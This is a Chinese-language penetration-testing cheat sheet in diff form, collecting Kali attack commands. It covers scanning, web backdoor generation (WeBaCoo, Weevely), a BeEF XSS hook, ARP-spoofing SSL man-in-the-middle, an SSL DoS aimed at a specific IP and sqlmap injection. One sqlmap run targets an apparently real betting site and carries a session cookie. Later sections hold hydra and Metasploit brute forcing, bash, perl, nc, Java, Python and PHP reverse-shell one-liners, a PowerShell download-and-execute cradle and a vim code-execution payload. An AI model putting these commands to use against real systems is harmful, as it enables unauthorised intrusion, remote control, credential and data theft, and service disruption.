@@ -1,0 +1,388 @@
+﻿#nmap
+
+端口扫描 nmap www.xxx.com
+指定DNS nmap --dns-servers 8.8.8.8 www.xxx.com
+加-Pn参数可以不使用探测之前的ICMP请求。不触发防火墙安全机制 nmap -Pn www.xxx.com
+
+
+#扫描tcp端口
+nmap 10.0.1.161  -p1-65535（扫描1-65535端口）
+或：nmap  10.0.1.161   -p20-200,7777,8888
+#扫描多个IP用法（nmap 10.0.1.161  10.0.1.162 或 nmap 10.0.1.161,162 或 nmap 10.0.1.161-162）
+#扫描一个子网网段所有IP（nmap 10.0.3.0/24）
+#扫描文件里的IP（nmap -iL ip.txt）
+#扫描地址段是排除某个（些）IP地址（nmap 10.0.1.161-164 --exclude 10.0.1.162,10.0.1.163）
+#扫描多个地址时排除文件里的IP地址（nmap 10.0.1.161-163 --excludefile ex.txt）
+
+查看nmap命令帮助信息：nmap -h(help)
+主机发现：nmap -sn 192.168.0.0/24
+端口扫描：nmap -sS -p1-1000 192.168.0.104
+系统扫描：nmap -O 192.168.0.104
+版本扫描：nmap -sV 192.168.0.104
+综合扫描：nmap -A 192.168.0.104
+扫描指定IP所开放的端口：nmap -sS -p 1-65535 -v XXX.XXX.XXX.XXX
+扫描C段存活主机：nmap -sP XXX.XXX.XXX.XXX/24
+指定端口扫描：nmap -p 80,1433,22,1521 XXX.XXX.XXX.XXX
+探测主机操作系统：nmap -o XXX.XXX.XXX.XXX
+全面的系统探测：nmap -v -A XXX.XXX.XXX.XXX（Nmap默认扫描主机1000个高危端口）
+探测指定网段：nmap XXX.XXX.XXX.XXX-XXX
+穿透防火墙进行扫描：nmap -Pn -A XXX.XXX.XXX.XXX（XXX.XXX.XXX.XXX禁止用ping的）
+使用脚本，扫描Web敏感目录：nmap -p 80 --script=http-enum.nse XXX.XXX.XXX.XXX
+———————————————————————————————————————————————————————————————
+Wireshark 过滤规则：
+#地址过滤
+地址：ip.addr == 192.168.1.1
+目的地址：ip.dst==192.168.1.1
+源地址：ip.src==192.168.1.1
+#端口过滤：
+tcp.port==80
+目的端口：tcp.dstport==80
+源端口：tcp.srcport==80
+#协议过滤
+http
+http.request.method=="GET"
+#多条件过滤：连接符and的使用（and也可以用&&）
+如过滤ip为192.168.1.1并且为http协议的，ip.src==192.168.1.1 and http
+———————————————————————————————————————————————————————————————
+#复制网站工具：httrack
+root@kali:~# httrack
+开始工作：
+1.Enter project name :dvwa （起个项目名）
+2.Base path (return=/root/websites/) :/root/dvwa (复制网站在本地保存位置)
+3.Enter URLs (separated by commas or blank spaces) :http://10.0.1.20/dvwa/ (复制网站拷贝的跟路径)
+———————————————————————————————————————————————————————————————
+#扫描工具：Nikto
+手册：man Nikto
+nikto -update 更新升级软件
+扫描：
+1.nikto -host http://10.0.1.20/dvwa/ 或nikto -host https://10.0.1.20/dvwa/
+2.nikto -host 10.0.1.20 -port 80,8080
+3.nikto -host www.baidu.com -port 443 -ssl（对HTTPS进行扫描）
+4.nikto -host www.baidu.com -ssl -port 443,8443,995（对HTTPS扫描多个端口）
+5.nikto -host host.txt（同时扫描多个地址，放在host.txt中,书写方式每行10.0.1.20:80或https://10.0.1.20:8443）
+6.nmap -p80 10.0.1.0/24 -oG - | nikto -host - （扫描当前网段下开80端口的应用）
+7.nikto -host https://www.baidu.com -useproxy http://localhost:8087（使用代理）
+8.对于主机头（域名）不同，但ip地址和端口相同的网站使用 -vhost +域名的方式进行扫描。nikto -vhost http://www.aaa.com/dvwa/
+9.-evasion逃避技术减少触发报警情况
+扫描过程中输入命令：
+Space 报告当前扫描状态
+v 显示详细信息
+d (debug)特别详细信息
+e 扫描过程错误信息
+p 扫描进度
+r 显示重定向相关信息
+c 显示cookie相关信息
+a 显示尝试身份认证过程信息
+q 退出
+N 不扫当前地址，扫描下一个地址（同时扫描多个应用地址时可以使用）
+P 暂停
+ 
+常见修改配置实现其他功能
+修改：vi /etc/nikto.conf
+1.USERAGENT 客户端代理标记 换成User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134可以伪装成IE。
+2.Proxy下配置默认代理信息
+3.STATIC-COOKIE="cookie1"="cookie value";"cookie2"="cookie val" 配置cookie信息
+———————————————————————————————————————————————————————————————
+扫描工具 skipfish
+手册：man skipfish
+使用：
+1.skipfish -o /root/test1 (附加命令) http://10.0.1.20/dvwa
+2.skipfish -o /root/test1 (附加命令) @url.txt（扫多个）
+3.skipfish -o /root/test1 (附加命令) -S /usr/share/skipfish/dictionaries/minimal.wl （-W a.wl 网站特有的字符串会被记录到a.wl文件中） http://1.1.1.1 #使用字典的方式
+4.skipfish (-A user:pass) -o /root/test1 (附加命令) http://10.0.1.20/dvwa 设置用户登录信息
+5.skipfish (-C 设置cookie： -C "cookie1=val1" -C "cookie2=val2") -o /root/test1 (附加命令) http://10.0.1.20/dvwa
+6.自动登录后扫描（--auth-form登录前得表单页面，--auth-form-target登录请求的action，--auth-user-field用户名的name属性，--auth-user用户名，--auth-pass-field密码的name属性，--auth-pass密码，--auth-verify-url登录成功后的路径） 命令如下：
+skipfish -o /root/test1 --auth-form http://10.0.1.20/dvwa/login.php --auth-form-target http://10.0.1.20/dvwa/login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http://10.0.1.20/dvwa/index.php -I dvwa http://10.0.1.20/dvwa/
+附加命令：
+-I aaa 只检查包含'aaa'的URL（大i）
+-X aaa 不检查包含'aaa'的URL
+-K 不对指定参数进行Fuzz测试
+-D 跨站点爬另外一个域
+-l 每秒最大请求数
+-m 每IP最大并发连接数
+--config 指定配置文件
+———————————————————————————————————————————————————————————————
+扫描器OWASP_ZAP（擅长手动爬网）
+#默认代理端口8080，浏览器需使用8080端口代理才能使用扫描器功能。
+#对于HTTPS，可以生成OWASP_ZAP的证书
+步骤：
+1.在OWASP_ZAP页面点击Options>Dynamic SSL Certificates>Save 生成以.cer结尾的证书文件。
+2.将证书文件设置在需要代理的浏览器中：preferences>寻找certificates>View Certifates>Authorities>Import>勾选需要的类型（一般选第一个，也可以全勾选上）>OK。
+#手动设置web应用自定义的sessionCookieName：Options>HTTP Sessions。
+#常用编码解码工具：Encode/Decode/Hash
+#流量截断：set break on all requests and responses
+#显示页面隐藏域：Show / enable fields
+———————————————————————————————————————————————————————————————
+截断代理：Burpsuite
+#默认侦听本地8080端口进行代理（其他主机无法使用本地8080端口进行代理，可修改）。
+#Proxy>Option>Request handing(Invisible)（一般用于客户端程序不支持代理的情况，可以强行使用代理）
+#DNS映射配置：Project options>Connections>Hostname Resolution>Add。
+#CA配置(HTTPS代理)：Proxy>Options>Import/export CA certificate（一般选择第一个公钥证书）导出。然后再导入到浏览器中即可。
+证书导出也可以在浏览器中访问：http://burp
+#截断配置：Proxy>Option>
+1.Intercept Client Requests配置客户端请求截断的规则（默认开启）。
+2.Intercept Server Responses配置服务端响应截断规则（默认关闭）。
+3.Match and Replace 替换请求中的字符串。
+#Target>Scope>Exclude from scope（将添加进scope的网址中不想爬的路径过滤）
+#比较两次爬网内容：在Site map空间中右键选择Compare site maps。
+#扫描Scanner:
+Options>Scan speed（扫描速度）。Scan accuracy（扫描准确性）
+#Jython文件下载地址：http://www/jython.org/downloads.html（下载完配置位置到:Extender>Options>Python Environment>select file...）
+#intruder
+Positions>Attack type(攻击类型)：
+1.Sniper：只需要指定1个文件,变量逐一地进行插入。
+2.Battering ram：只需要指定1个文件，同时在多个变量放同一个值。
+3.Pitchfork：需指定多个文件（变量数量），第一个字典第一行放在变量1,第二个字典第一行放在变量2。执行中如果不满足变量匹配则停止。
+4.Cluster bomb：需指定多个文件（变量数量），全交叉模式攻击。
+Payload>Payload Sets：设置文件序号和加载类型。
+Payload Options：指定文件。
+Results>Filter：可过滤响应字符串。
+Options>Grep-Match：设置字符串，如果响应内容包含，则增加标记。（默认设置不包含headers）
+#Repeater
+右键>change request method：GET/POST请求转换
+右键>change body encoding：改变提交编码方式（二进制流的形式）
+Copy as curl command：拷贝成curl作为终端命令。
+#Sequencer：检验随机数的随机性。
+———————————————————————————————————————————————————————————————
+#校验字符加密方式
+命令：hash-identifier
+#md5值破解
+命令：john --format=raw-MD5 aaa
+破解值会在/root/.john/john.pot中
+#生成md5值
+命令：echo 'abc' | md5sum（*注意*该值不是通常的md5值）
+#kali漏洞利用向量字典：/usr/share/wfuzz/wordlist/general
+#base64
+echo asdasda | base64（转）
+echo YXNkYXNkYQo= | base64 -d（解）
+#hash破解网站：https://www.cmd5.com/（付费）
+
+———————————————————————————————————————————————————————————————
+#kali启动本地默认web应用：service apache2 start	关闭命令：service apache2 stop
+———————————————————————————————————————————————————————————————
+#ssh远程连接服务器
+ssh root@192.168.43.144
+———————————————————————————————————————————————————————————————
+#beef xss framework
+管理地址：http://127.0.0.1:3000/ui/authentication
+注入脚本：<script src="http://192.168.43.171:3000/hook.js"></script>
+登录：beef/beef
+创建持久连接：Persistence>
+Confirm Close Tab（禁止离开此页） / Create Pop Under(弹出小对话框)
+录音：Start Recording Audio
+———————————————————————————————————————————————————————————————
+#中国菜刀
+下载：http://www.maicaidao.co/
+———————————————————————————————————————————————————————————————
+#WeBaCoo（Web Backdoor Cookie）
+编码通信内容通过cookie头传输，隐蔽性强（目前发现只能用于PHP项目）
+默认：
+cm=：base64编码的命令
+cn=：服务器用于返回数据的cookie头的名
+cp=：返回信息定界符
+查看帮助：webacoo -h
+命令：webacoo -g -o a.php（生成后门文件。-g参数生成后门代码，-o参数输出为一个文件）
+连接客户端：webacoo -t -u http://192.168.43.144/a.php（-t参数指定进行客户端的连接，-u参数指定目标URL）
+———————————————————————————————————————————————————————————————
+#Weevely
+weevely generate 123456 wee.php（生成后门文件，目前发现只能用于PHP项目）
+早期版本生成文件会在：/usr/share/weevely/，当前版本会在当前路径下。
+连接客户端：weevely http://192.168.43.144/wee.php 123456
+#help：帮助
+#net_proxy：使用目标作为代理
+默认在本地开8080端口，访问8080端口走代理。
+#net_scan 192.168.1.1 80 利用目标服务器扫描其他主机端口。
+———————————————————————————————————————————————————————————————
+#SSL
+#sslscan
+sslscan --tlsall www.taobao.com:443（tls要扫描的协议）
+sslscan --show-certificate --no-ciphersuites www.taobao.com:443（显示详细）
+#openssl
+openssl s_client -connect www.baidu.com:443（连接服务器查看证书信息）
+#伪造根证书
+利用openssl生成证书私钥：openssl genrsa -out ca.key 2048
+利用私钥签名生成证书：openssl req -new -x509 -days 1096 -key ca.key -out ca.crt
+
+#准备工作：
+#kali开启路由功能：sysctl -w net.ipv4.ip_forward=1 重启失效（或手动修改配置文件/proc/sys/net/ipv4/ip_forward 默认值是0）
+#arp地址欺骗
+arpspoof -i eth0 -t 192.168.0.104 -r 192.168.0.1（欺骗目标主机192.168.0.104，选择我的mac地址作为网关）
+查看网关mac地址：arp -a
+#SSLsplit
+透明SSL/TLS中间人攻击工具，伪装服务器需要伪造证书，支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击。
+sslsplit -D -l connect.log -j /root/test -S /root/test/logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080（侦听本地8080和8443端口，对应请求http，https 目前证书无效）
+#mitmproxy 默认代理端口是8080，可以使用 -p 命令指定一个端口并启动：mitmproxy -p 8888（目前端口转发的方式有问题）
+点击连接查看详细信息、tab键切换、q退出详细信息页。
+#sslstrip -l 8080（将https在客户端转换成http，会在当前路径下生成日志文件）
+#DOS攻击--------------------------------------------
+根据域名查看IP：dig www.baidu.com
+攻击：thc-ssl-dos 88.218.147.207 443 --accept
+网站防护对策：SSL-Renegotiation、使用SSL Accelerator
+通过修改thc-ssl-dos源代码，可以绕过以上对策。
+———————————————————————————————————————————————————————————————
+#SQLMAP
+sqlmap --update 更新
+sqlmap -h 说明参数（sqlmap -hh 所有参数）
+sqlmap -u "" 扫描URL地址
+sqlmap -u "" -p username -f（对某个参数进行检查 -f查数据库版本信息）
+sqlmap -u "" -p username --users（查看数据库管理账号）
+sqlmap -u "" -p username --dbs（查看有哪些库）
+sqlmap -u "" -p username --schema（查源数据库）
+sqlmap -u "" -p username -a（以上全查）
+web当前使用的是哪个数据库
+--current -db
+web当前数据库的账户
+--current -user
+-D       指定数据库名称
+-T       指定数据表名称
+-C       指定需要枚举的DBMS数据库表字段
+输出到指定目录：--output-dir=E:\sqlmapOutput
+--dump   导出数据表项(否则shell上不会显示内容，只能到日志中查看)
+sqlmap -u "" -p username -D demo1 -T sys_user -C username --dump
+sqlmap -m ulist.txt（扫描文件里面的URL）
+sqlmap -d "mysql://user:password@192.168.0.101:3306/user1" -f --users --banner --dbs --schema（直接连接数据库）
+sqlmap -r post.txt --dbs（扫描请求信息，可以扫描以POST提交的信息，文件内容可用burp抓取）
+sqlmap -l log.txt（扫描burp请求生成的日志文件）
+sqlmap -l log.txt --scope="(www)?\.target\.(com|net|org)" 正则过滤
+sqlmap -u "http://1.1.1.1/a.jsp" --data="user=1,pass=2" --param-del="," -f（get/post自适应,--param-del以","分割参数，默认以"&"）
+注入路径类型参数：url相应位置加*
+sqlmap -u "" --cookie=""
+--random-agent 随机User-Agent
+--user-agent="" 自己设置
+--delay 每次http(s)请求之间延迟时间，浮点数，单位为秒，默认无延迟。--delay="1.5"
+--timeout 请求超时时间，浮点数，默认为30秒。--timeout="20"
+--retries http(s)连接超时重试次数，默认3次。--retries http="2"
+--randomize 长度、类型与原始值保持一致的前提下，指定每次请求随机取值得参数名。--randomize="username"
+
+sqlmap -u "https://www.mtc37.com/bet/bet.do?_t=1552302698069" --data="gameId=5&totalNums=2&totalMoney=2&betSrc=0&turnNum=20190311031&betBean%5B0%5D.playId=512801&betBean%5B0%5D.money=1&betBean%5B1%5D.playId=512806&betBean%5B1%5D.money=1" --cookie="x-session-token=TQrfT99pprFpwdiBEdbZhc6SKy88T%2BUjeBTthx3kPY3PuImjO8qQVg%3D%3D; _skin_=red"  -p "betBean%5B1%5D.money" -f
+
+POST注入
+sqlmap.py -r test.txt -p username --dbs
+
+#基于HTTP协议的身份验证(极少情况) Basic Digest NTLM：
+sqlmap -u "http://1.1.1.1/a.jsp?id=1" --auth-type Basic --auth-cred "user:pass"
+
+———————————————————————————————————————————————————————————————
+服务器口令暴力破解
+hydra -l root -P pass.txt 192.168.0.102 ssh
+———————————————————————————————————————————————————————————————
+#MSFCONSOLE
+暴力破解mysql口令
+启动：
+msfconsole
+扫描所有有效的Mysql模块：
+msf > search mysql
+使用Mysql登录模块：
+msf > use auxiliary/scanner/mysql/mysql_login
+显示模块的有效选项：
+msf auxiliary(scanner/mysql/mysql_login) > show options
+为攻击目标指定目标系统IP，用户文件，密码文件：
+msf auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.52.1
+msf auxiliary(scanner/mysql/mysql_login) > set user_file /root/username.txt
+msf auxiliary(scanner/mysql/mysql_login) > set pass_file /root/password.txt
+msf auxiliary(scanner/mysql/mysql_login) > set STOP_ON_SUCCESS true
+攻击：
+msf auxiliary(scanner/mysql/mysql_login) > exploit
+
+爆破ssh：
+use auxiliary/scanner/ssh/ssh_login
+爆破ftp：
+use auxiliary/scanner/ftp/ftp_login
+爆破telnet：
+use auxiliary/scanner/telnet/telnet_login
+爆破smb：
+auxiliary/scanner/smb/smb_login
+爆破Mysql：
+use scanner/mysql/mysql_login
+使用mof模块进行权限获取：
+use windows/mysql/mysql_mof
+———————————————————————————————————————————————————————————————
+反弹shell
+Bash
+部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口
+bash -i >& /dev/tcp/x.x.x.x/2333 0>&1
+uri编码后：
+%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%33%2e%31%37%31%2f%31%32%33%34%20%30%3e%26%31
+
+perl命令
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Netcat反弹shell也是常用兵器,经典命令参数-e
+nc -e /bin/sh x.x.x.x 2333
+但某些版本的nc没有-e参数(非传统版),则可使用以下方式解决
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 2333 >/tmp/f
+或者本地监听两个端口,通过管道,一处输入,一处输出
+nc x.x.x.x 2333|/bin/sh|nc x.x.x.x 2444
+其他方式基本沿用以上思路,如将nc更换为telnet等
+mknod backpipe p && telnet x.x.x.x 2333 0<backpipe | /bin/bash 1>backpipe
+Metasploit的payload也提供各种反弹脚本
+msf > msfpayload php/reverse_php LHOST=x.x.x.x LPORT=2333 R > re.php
+
+msf > use multi/handler
+msf exploit(handler) > set PAYLOAD php/reverse_php
+msf exploit(handler) > set LHOST x.x.x.x
+msf exploit(handler) > set LPORT 2333
+msf exploit(handler) > exploit
+
+JAVA:
+Runtime r = Runtime.getRuntime();
+String[] s = {"/bin/bash","-c","exec 5<>/dev/tcp/103.72.165.8/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+try {
+	Process p = r.exec(s);
+	p.waitFor();
+} catch (Exception e) {
+	e.printStackTrace();
+}
+
+python Linux Python2.7：
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP:
+php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+利用powershell反弹shell到metasploit
+一、使用msfvenom生成PS1文件
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.171 LPORT=1234 -f psh-reflection >1.ps1
+二、开启msf监听：
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.43.171
+msf exploit(handler) > set lport 1234
+msf > run
+启动apache2，并将1.ps1复制到/var/www/html/目录下，访问1.ps1存在。（kali：service apache2 start;cp 1.ps1 /var/www/html）
+三、在目标机器执行cmd命令：
+powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.171/1.ps1');1.ps1"
+——————————————————————————————————————————————————————————————
+vim任意代码执行漏洞反弹shell：
+创建shell.txt，内容如下
+\x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 192.168.43.171 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n
+侦听：9999端口
+执行:$vim shell.txt
+
+使用OpenSSL侦听端口接收反弹shell
+生成证书：
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+侦听端口：
+openssl s_server -quiet -key key.pem -cert cert.pem -port 1234
+——————————————————————————————————————————————————————————————
+建立SSH隧道：
+1.将本地端口与远程服务器建立隧道：
+vi /etc/ssh/sshd_config
+- PermitRootLogin yes
+- Port 53
+- PasswordAuthentication yes
+service ssh restart
+隧道建立命令： ssh -fNg -L 7001:192.168.43.198:22 root@192.168.43.177 -p 22	（第一个ip是拿到的，第二个是目标）
+-L: 本地端口转发
+-f: 后台运行进程
+-N: 不执行登录shell
+-g: 复用访问时作为网管，支持多主机访问本地侦听端口(即：如果不加此选项则7001端口只在127.0.0.1接口上侦听，加上此选项则7001端口在0.0.0.0接口上侦听)
+7001: 在本地开启侦听的端口
+172.20.163.135:22 : B主机及要连的端口
+172.20.163.136: A主机
+
+结果验证：ssh root@127.0.0.1 -p 7001 ====>此时将直接连到B主机的22端口
+——————————————————————————————————————————————————————————————
+curl使用socks5
+curl -v  --socks5 192.168.3.111:9999 -U username:password https://github.com
